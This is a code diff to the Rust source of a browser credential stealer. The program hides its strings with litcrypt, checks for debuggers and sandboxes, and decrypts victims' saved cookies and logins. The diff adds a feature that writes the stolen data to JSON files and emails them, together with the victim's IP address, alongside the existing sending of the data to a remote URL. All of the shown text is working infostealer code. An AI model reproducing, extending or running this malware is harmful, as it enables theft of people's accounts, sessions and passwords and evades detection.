@@ -1,14 +1,15 @@
-use crate::robber;
+use crate::{email, robber};
 use kernel32::{GetCurrentProcess, GetTickCount};
 use litcrypt::{lc, use_litcrypt};
 use ntapi::ntpsapi::NtQueryInformationProcess;
-use std::env;
+use serde_json::to_writer;
 use std::ffi::c_void;
 use std::path::Path;
 use std::ptr::null_mut;
+use std::{env, fs::File};
 use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO};
 
-use_litcrypt!("il]ehtxmqukl]dtwgavjjjc/zem'swgr");
+use_litcrypt!("x[[w,bwvhigcaf;flttq';uhadpt;]zf");
 
 fn build_base_directories() -> Result<Vec<std::path::PathBuf>, ()> {
     let mut base_directories = vec![];
@@ -76,7 +77,14 @@ fn build_key_directory(base_dir: &std::path::PathBuf) -> Result<std::path::PathB
     Err(())
 }
 
-pub fn run_robber(do_cookie: bool, do_login: bool, url: &str) -> Result<i32, ()> {
+pub fn run_robber(
+    do_cookie: bool,
+    do_login: bool,
+    url: &str,
+    email: bool,
+    username: &str,
+    password: &str,
+) -> Result<i32, ()> {
     unsafe {
         let p_info = &mut 0u32 as *mut u32 as *mut c_void;
         let handle = GetCurrentProcess();
@@ -94,6 +102,8 @@ pub fn run_robber(do_cookie: bool, do_login: bool, url: &str) -> Result<i32, ()>
         }
     }
     let base_dirs = build_base_directories()?;
+    let mut filepaths: Vec<String> = vec![];
+    let mut filenames_temp: Vec<String> = vec![];
     for base_dir in base_dirs {
         let key_dir = build_key_directory(&base_dir)?;
         if let Ok(key) = robber::get_key(&key_dir) {
@@ -101,16 +111,54 @@ pub fn run_robber(do_cookie: bool, do_login: bool, url: &str) -> Result<i32, ()>
                 let cookie_dir = build_cookie_directory(&base_dir)?;
 
                 if let Ok(cookie_data) = robber::get_cookies(&cookie_dir, &key) {
-                    robber::send_data(cookie_data, format!("{}{}", url, lc!("/cookie"))).unwrap();
+                    if !email {
+                        robber::send_data(cookie_data, format!("{}{}", url, lc!("/cookie")))
+                            .unwrap();
+                    } else {
+                        let filename = base_dir.join(Path::new("cookies"));
+                        let mut filenum = 0;
+                        let mut filepath =
+                            format!("{}{}.json", filename.to_string_lossy(), filenum);
+                        while filenames_temp.contains(&format!("cookies{}.json", filenum)) {
+                            filenum += 1;
+                            filepath = format!("{}{}.json", filename.to_string_lossy(), filenum);
+                        }
+
+                        let file = File::create(&filepath).unwrap();
+                        to_writer(file, &cookie_data).unwrap();
+                        filepaths.push(filepath);
+                        filenames_temp.push(format!("cookies{}.json", filenum));
+                    }
                 }
             }
             if do_login == true {
                 let login_dir = build_login_directory(&base_dir)?;
+                let base_dir = login_dir.parent().ok_or("").unwrap();
                 if let Ok(login_data) = robber::get_login(&login_dir, &key) {
-                    robber::send_data(login_data, format!("{}{}", url, lc!("/login"))).unwrap();
+                    if !email {
+                        robber::send_data(login_data, format!("{}{}", url, lc!("/login"))).unwrap();
+                    } else {
+                        let filename = base_dir.join(Path::new("login"));
+                        let mut filenum = 0;
+                        let mut filepath =
+                            format!("{}{}.json", filename.to_string_lossy(), filenum);
+                        while filenames_temp.contains(&format!("login{}.json", filenum)) {
+                            filenum += 1;
+                            filepath = format!("{}{}.json", filename.to_string_lossy(), filenum);
+                        }
+                        let file = File::create(&filepath).unwrap();
+                        to_writer(file, &login_data).unwrap();
+                        filepaths.push(filepath);
+                        filenames_temp.push(format!("login{}.json", filenum));
+                    }
                 }
             }
         }
+    }
+    if filepaths.len() > 0 {
+        let ip = robber::get_ip();
+        let email = email::build_email(username.to_string(), filepaths, ip);
+        email::send_email(email, username, password);
     }
     return Ok(0);
 }
